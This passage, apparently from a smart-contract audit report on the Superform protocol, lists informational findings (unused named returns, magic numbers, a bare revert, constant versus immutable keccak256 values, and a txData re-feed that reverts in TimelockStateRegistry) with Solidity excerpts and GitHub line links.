281:                 ReturnSingleData memory rsd = abi.decode(coreStateRegistry_.payloadBody(dstPayloadId_), (ReturnSingleData));
282:                 amounts = new uint256[](1);
283:                 amounts[0] = rsd.amount;
284:                 return (amounts, rsd.payloadId);
285:             }

305:         if (multi_ == 1) {
306:                 InitMultiVaultData memory imvd =
307:                     abi.decode(coreStateRegistry_.payloadBody(dstPayloadId_), (InitMultiVaultData));
308:     
309:                 return (
310:                     imvd.amounts,
311:                     imvd.maxSlippages,
312:                     imvd.superformIds,
313:                     imvd.hasDstSwaps,
314:                     imvd.extraFormData,
315:                     imvd.receiverAddress,
316:                     imvd.payloadId
317:                 );
318:             } else {
319:                 InitSingleVaultData memory isvd =
320:                     abi.decode(coreStateRegistry_.payloadBody(dstPayloadId_), (InitSingleVaultData));
321:     
322:                 amounts = new uint256[](1);
323:                 amounts[0] = isvd.amount;
324:     
325:                 slippages = new uint256[](1);
326:                 slippages[0] = isvd.maxSlippage;
327:     
328:                 superformIds = new uint256[](1);
329:                 superformIds[0] = isvd.superformId;
330:                 hasDstSwaps = new bool[](1);
331:                 hasDstSwaps[0] = isvd.hasDstSwap;
332:                 receiverAddress = isvd.receiverAddress;
333:     
334:                 return (
335:                     amounts, slippages, superformIds, hasDstSwaps, isvd.extraFormData, isvd.receiverAddress, isvd.payloadId
336:                 );
337:             }

```

[156-160](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L156-L160), [277-285](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L277-L285), [305-337](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L305-L337)




### Unused named `return`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Declaring named returns, but not using them, is confusing to the reader. Consider either completely removing them (by declaring just the type without a name), or remove the return statement and do a variable assignment.
This would improve the readability of the code, and it may also help reduce regressions during future code refactors.

*Instances (21)*:


```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

/// @audit not used  amb
197:     function _getAmbAddress(uint8 id_) internal view returns (address amb) {

```

[197](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L197)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

/// @audit not used  fees
128:     function estimateFees(
129:             bytes memory, /*message_*/
130:             bytes memory /*extraData_*/
131:         )
132:             external
133:             view
134:             override
135:             returns (uint256 fees)
136:         {

```

[128-136](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L128-L136)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit not used  id
330:     function _getStateRegistryId(address registryAddress_) internal view returns (uint8 id) {

```

[330](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L330)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

/// @audit not used  timelockPayload_
92:     function getTimelockPayload(uint256 payloadId_) external view returns (TimelockPayload memory timelockPayload_) {

/// @audit not used  returnMessage
257:     function _constructSingleReturnData(
258:             address srcSender_,
259:             InitSingleVaultData memory singleVaultData_
260:         )
261:             internal
262:             view
263:             returns (bytes memory returnMessage)
264:         {

```

[92](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L92), [257-264](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L257-L264)

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

/// @audit not used  bridgeIds, txDatas, tokens, liqDstChainIds, amountsIn, nativeAmounts
137:     function decodeCoreStateRegistryPayloadLiqData(uint256 dstPayloadId_)
138:             external
139:             view
140:             override
141:             returns (
142:                 uint8[] memory bridgeIds,
143:                 bytes[] memory txDatas,
144:                 address[] memory tokens,
145:                 uint64[] memory liqDstChainIds,
146:                 uint256[] memory amountsIn,
147:                 uint256[] memory nativeAmounts
148:             )
149:         {

/// @audit not used  srcPayloadId
181:     function decodeTimeLockPayload(uint256 timelockPayloadId_)
182:             external
183:             view
184:             override
185:             returns (address srcSender, uint64 srcChainId, uint256 srcPayloadId, uint256 superformId, uint256 amount)
186:         {

/// @audit not used  srcPayloadId
268:     function _decodeReturnData(
269:             uint256 dstPayloadId_,
270:             uint8 multi_,
271:             IBaseStateRegistry coreStateRegistry_
272:         )
273:             internal
274:             view
275:             returns (uint256[] memory amounts, uint256 srcPayloadId)
276:         {

/// @audit not used  srcPayloadId
288:     function _decodeInitData(
289:             uint256 dstPayloadId_,
290:             uint8 multi_,
291:             IBaseStateRegistry coreStateRegistry_
292:         )
293:             internal
294:             view
295:             returns (
296:                 uint256[] memory amounts,
297:                 uint256[] memory slippages,
298:                 uint256[] memory superformIds,
299:                 bool[] memory hasDstSwaps,
300:                 bytes memory extraFormData,
301:                 address receiverAddress,
302:                 uint256 srcPayloadId
303:             )
304:         {

```

[137-149](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L137-L149), [181-186](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L181-L186), [268-276](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L268-L276), [288-304](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L288-L304)

```solidity
File: superform-core/src/crosschain-data/utils/QuorumManager.sol

/// @audit not used  quorum_
23:     function getRequiredMessagingQuorum(uint64 srcChainId_) public view returns (uint256 quorum_) {

```

[23](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/QuorumManager.sol#L23)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

/// @audit not used  valid_
26:     function validateReceiver(bytes calldata txData_, address receiver_) external pure override returns (bool valid_) {

```

[26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L26)

```solidity
File: superform-core/src/libraries/PayloadUpdaterLib.sol

/// @audit not used  valid_
10:     function validateSlippage(
11:            uint256 newAmount_,
12:            uint256 maxAmount_,
13:            uint256 slippage_
14:        )
15:            internal
16:            pure
17:            returns (bool valid_)
18:        {

```

[10-18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/PayloadUpdaterLib.sol#L10-L18)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit not used  totalFees
129:     function getRegisterTransmuterAMBData()
130:             external
131:             view
132:             override
133:             returns (uint256 totalFees, bytes memory extraData)
134:         {

/// @audit not used  totalFees
589:     function estimateAckCost(uint256 payloadId_) external view returns (uint256 totalFees) {

/// @audit not used  gasUsed
695:     function _estimateSwapFees(
696:             uint64 dstChainId_,
697:             bool[] memory hasDstSwaps_
698:         )
699:             internal
700:             view
701:             returns (uint256 gasUsed)
702:         {

/// @audit not used  gasUsed
725:     function _estimateUpdateCost(uint64 dstChainId_, uint256 vaultsCount_) internal view returns (uint256 gasUsed) {

/// @audit not used  gasUsed
730:     function _estimateDstExecutionCost(
731:             bool isDeposit_,
732:             uint64 dstChainId_,
733:             uint256 vaultsCount_
734:         )
735:             internal
736:             view
737:             returns (uint256 gasUsed)
738:         {

/// @audit not used  nativeFee
745:     function _estimateAckProcessingCost(uint256 vaultsCount_) internal view returns (uint256 nativeFee) {

```

[129-134](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L129-L134), [589](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L589), [695-702](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L695-L702), [725](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L725), [730-738](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L730-L738), [745](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L745)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

/// @audit not used  valid_
178:     function isValidStateRegistry(address registryAddress_) external view override returns (bool valid_) {

/// @audit not used  valid_
185:     function isValidAmbImpl(address ambAddress_) external view override returns (bool valid_) {

/// @audit not used  valid_
193:     function isValidBroadcastAmbImpl(address ambAddress_) external view override returns (bool valid_) {

```

[178](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L178), [185](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L185), [193](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L193)



### Updating `txData` in `finalizePayload` will revert in most cases.

**Severity:** Informational

**Context:** [TimelockStateRegistry.sol#L147-L147](superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol#L147-L147)

**Description**:
In the `finalizePayload` function of `TimelockStateRegistry.sol` the `TimelockStateRegistryProcessor` can update the `txData` of a user's `liqRequest` if it has gone stale by providing data to the `txData_` parameter. As stated in a comment by the developer team:
`@dev this step is used to re-feed txData to avoid using old txData that would have expired by now`
The issue is that this part of the code will only function if the `liqRequest.txData` of the user is empty in the first place.

If a user has provided `txData` to their request, the `validateLiqRequest` will fail due to the following if statement:
```
if (req_.token == address(0) || (req_.token != address(0) && req_.txData.length != 0)) {
            revert Error.CANNOT_UPDATE_WITHDRAW_TX_DATA();
        }
```
Essentially, the function reverts when `req_.token == address(0)` or when `req_.txData.length != 0`. 

Therefore, re-feeding `txData` to update stale `txData` will only work if the user has not provided any data in the first place which is contradictory to the actual purpose of this part of the code as in order to update data provided by the user, `liqRequest.txData` should not be empty. 

As a result, if `txData` has gone stale the `TimelockStateRegistryProcessor` cannot update it.

**Recommendation**:
Using `validateLiqReq` seems unnecessary. Perhaps, only checking if `req_.token == address(0)` would be sufficient.



### Unusual loop variable

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


The normal name `for` loop variables is `i`, and when there is a nested `loop`, to use `j`. The code below chooses to use another variable without being nested within another `for`-loop, which may lead to confusion

*Instances (1)*:

```solidity
File: superform-core/src/BaseRouterImplementation.sol

268:         for (uint256 j; j < len; ++j) {

```

[268](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L268)





### `Constant`s should be defined rather than using magic numbers

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39)can benefit from using readable constants instead of hex/numeric literals

*Instances (37)*:


```solidity
File: ERC1155A/src/ERC1155A.sol

/// @audit 0x01ffc9a7
369:         return interfaceId == 0x01ffc9a7 // ERC165 Interface ID for ERC165

/// @audit 0xd9b67a26
370:             || interfaceId == 0xd9b67a26 // ERC165 Interface ID for ERC1155

/// @audit 0x0e89341c
371:             || interfaceId == 0x0e89341c; // ERC165 Interface ID for ERC1155MetadataURI

```

[369](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L369), [370](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L370), [371](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L371)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

/// @audit 32
115:         if (data.params.length == 32) {

```

[115](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L115)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

/// @audit 4
244:         if (bytes4(data_[:4]) == StandardizedCallFacet.standardizedCall.selector) {

/// @audit 4
246:             callData = abi.decode(data_[4:], (bytes));

/// @audit 4
249:             _slice(callData, 4, callData.length - 4), (bytes32, string, string, address, uint256, LibSwap.SwapData[])

/// @audit 4
249:             _slice(callData, 4, callData.length - 4), (bytes32, string, string, address, uint256, LibSwap.SwapData[])

```

[244](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L244), [246](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L246), [249](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L249), [249](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L249)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketOneInchValidator.sol

/// @audit 4
95:         return callData[4:];

```

[95](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketOneInchValidator.sol#L95)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

/// @audit 4
117:         return callData[4:];

```

[117](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L117)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

/// @audit 10
98:         return IERC4626(vault).convertToAssets(10 ** vaultDecimals);

/// @audit 10
119:         return IERC4626(vault).previewRedeem(10 ** vaultDecimals);

```

[98](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L98), [119](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L119)

```solidity
File: superform-core/src/libraries/DataLib.sol

/// @audit 8
21:         txInfo |= uint256(callbackType_) << 8;

/// @audit 16
22:         txInfo |= uint256(multi_) << 16;

/// @audit 24
23:         txInfo |= uint256(registryId_) << 24;

/// @audit 32
24:         txInfo |= uint256(uint160(srcSender_)) << 32;

/// @audit 192
25:         txInfo |= uint256(srcChainId_) << 192;

/// @audit 8
34:         callbackType = uint8(txInfo_ >> 8);

/// @audit 16
35:         multi = uint8(txInfo_ >> 16);

/// @audit 24
36:         registryId = uint8(txInfo_ >> 24);

/// @audit 32
37:         srcSender = address(uint160(txInfo_ >> 32));

/// @audit 192
38:         srcChainId = uint64(txInfo_ >> 192);

/// @audit 160
52:         formImplementationId_ = uint32(superformId_ >> 160);

/// @audit 192
53:         chainId_ = uint64(superformId_ >> 192);

/// @audit 192
76:         chainId_ = uint64(superformId_ >> 192);

/// @audit 160
97:         superformId_ |= uint256(formImplementationId_) << 160;

/// @audit 192
98:         superformId_ |= uint256(chainId_) << 192;

```

[21](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L21), [22](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L22), [23](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L23), [24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L24), [25](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L25), [34](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L34), [35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L35), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L36), [37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L37), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L38), [52](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L52), [53](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L53), [76](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L76), [97](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L97), [98](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L98)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit 3
481:         if (configType_ == 3) {

/// @audit 4
486:         if (configType_ == 4) {

/// @audit 5
491:         if (configType_ == 5) {

/// @audit 6
496:         if (configType_ == 6) {

/// @audit 7
501:         if (configType_ == 7) {

/// @audit 8
506:         if (configType_ == 8) {

/// @audit 9
511:         if (configType_ == 9) {

/// @audit 10
516:         if (configType_ == 10) {

/// @audit 11
521:         if (configType_ == 11) {

/// @audit 3
582:             } else if (ambIds_[i] == 3) {

```

[481](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L481), [486](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L486), [491](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L491), [496](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L496), [501](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L501), [506](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L506), [511](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L511), [516](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L516), [521](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L521), [582](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L582)



### Custom errors should be used rather than `revert()`/`require()`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Custom errors are available from solidity version 0.8.4. Custom errors are more easily processed in `try-catch` blocks, and are easier to re-use and maintain.

*Instances (1)*:

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

94:         revert();

```

[94](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L94)



### Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

While it doesn't save any gas because the compiler knows that developers often make this mistake, it's still best to use theright tool for the task at hand. There is a difference between `constant` variables and `immutable` variables, and they shouldeach be used in their appropriate contexts. `constants` should be used for literal values written into the code, and `immutable`variables should be used for expressions, or values calculated in, or passed into the constructor.

*Instances (35)*:


```solidity
File: superform-core/src/SuperformFactory.sol

32:     bytes32 constant SYNC_IMPLEMENTATION_STATUS = keccak256("SYNC_IMPLEMENTATION_STATUS");

```

[32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L32)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

19:     bytes32 public constant SYNC_REVOKE = keccak256("SYNC_REVOKE");

23:     bytes32 public constant override PROTOCOL_ADMIN_ROLE = keccak256("PROTOCOL_ADMIN_ROLE");

27:     bytes32 public constant override EMERGENCY_ADMIN_ROLE = keccak256("EMERGENCY_ADMIN_ROLE");

31:     bytes32 public constant override PAYMENT_ADMIN_ROLE = keccak256("PAYMENT_ADMIN_ROLE");

36:     bytes32 public constant override BROADCASTER_ROLE = keccak256("BROADCASTER_ROLE");

40:     bytes32 public constant override CORE_STATE_REGISTRY_PROCESSOR_ROLE =
41:            keccak256("CORE_STATE_REGISTRY_PROCESSOR_ROLE");

45:     bytes32 public constant override TIMELOCK_STATE_REGISTRY_PROCESSOR_ROLE =
46:            keccak256("TIMELOCK_STATE_REGISTRY_PROCESSOR_ROLE");

50:     bytes32 public constant override BROADCAST_STATE_REGISTRY_PROCESSOR_ROLE =
51:            keccak256("BROADCAST_STATE_REGISTRY_PROCESSOR_ROLE");

55:     bytes32 public constant override CORE_STATE_REGISTRY_UPDATER_ROLE = keccak256("CORE_STATE_REGISTRY_UPDATER_ROLE");

59:     bytes32 public constant override CORE_STATE_REGISTRY_RESCUER_ROLE = keccak256("CORE_STATE_REGISTRY_RESCUER_ROLE");

63:     bytes32 public constant override CORE_STATE_REGISTRY_DISPUTER_ROLE = keccak256("CORE_STATE_REGISTRY_DISPUTER_ROLE");

67:     bytes32 public constant override DST_SWAPPER_ROLE = keccak256("DST_SWAPPER_ROLE");

72:     bytes32 public constant override WORMHOLE_VAA_RELAYER_ROLE = keccak256("WORMHOLE_VAA_RELAYER_ROLE");

```

[19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L19), [23](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L23), [27](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L27), [31](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L31), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L36), [40-41](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L40-L41), [45-46](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L45-L46), [50-51](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L50-L51), [55](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L55), [59](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L59), [63](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L63), [67](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L67), [72](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L72)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

23:     bytes32 public constant override SUPERFORM_ROUTER = keccak256("SUPERFORM_ROUTER");

26:     bytes32 public constant override SUPERFORM_FACTORY = keccak256("SUPERFORM_FACTORY");

29:     bytes32 public constant override SUPER_TRANSMUTER = keccak256("SUPER_TRANSMUTER");

32:     bytes32 public constant override PAYMASTER = keccak256("PAYMASTER");

36:     bytes32 public constant override PAYMENT_HELPER = keccak256("PAYMENT_HELPER");

39:     bytes32 public constant override CORE_STATE_REGISTRY = keccak256("CORE_STATE_REGISTRY");

42:     bytes32 public constant override TIMELOCK_STATE_REGISTRY = keccak256("TIMELOCK_STATE_REGISTRY");

45:     bytes32 public constant override BROADCAST_REGISTRY = keccak256("BROADCAST_REGISTRY");

48:     bytes32 public constant override SUPER_POSITIONS = keccak256("SUPER_POSITIONS");

51:     bytes32 public constant override SUPER_RBAC = keccak256("SUPER_RBAC");

54:     bytes32 public constant override PAYLOAD_HELPER = keccak256("PAYLOAD_HELPER");

57:     bytes32 public constant override DST_SWAPPER = keccak256("DST_SWAPPER");

60:     bytes32 public constant override EMERGENCY_QUEUE = keccak256("EMERGENCY_QUEUE");

63:     bytes32 public constant override PAYMENT_ADMIN = keccak256("PAYMENT_ADMIN");

64:     bytes32 public constant override CORE_REGISTRY_PROCESSOR = keccak256("CORE_REGISTRY_PROCESSOR");

65:     bytes32 public constant override BROADCAST_REGISTRY_PROCESSOR = keccak256("BROADCAST_REGISTRY_PROCESSOR");

66:     bytes32 public constant override TIMELOCK_REGISTRY_PROCESSOR = keccak256("TIMELOCK_REGISTRY_PROCESSOR");

67:     bytes32 public constant override CORE_REGISTRY_UPDATER = keccak256("CORE_REGISTRY_UPDATER");

68:     bytes32 public constant override CORE_REGISTRY_RESCUER = keccak256("CORE_REGISTRY_RESCUER");

69:     bytes32 public constant override CORE_REGISTRY_DISPUTER = keccak256("CORE_REGISTRY_DISPUTER");

70:     bytes32 public constant override DST_SWAPPER_PROCESSOR = keccak256("DST_SWAPPER_PROCESSOR");

```

[23](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L23), [26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L26), [29](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L29), [32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L32), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L36), [39](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L39), [42](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L42), [45](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L45), [48](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L48), [51](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L51), [54](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L54), [57](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L57), [60](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L60), [63](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L63), [64](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L64), 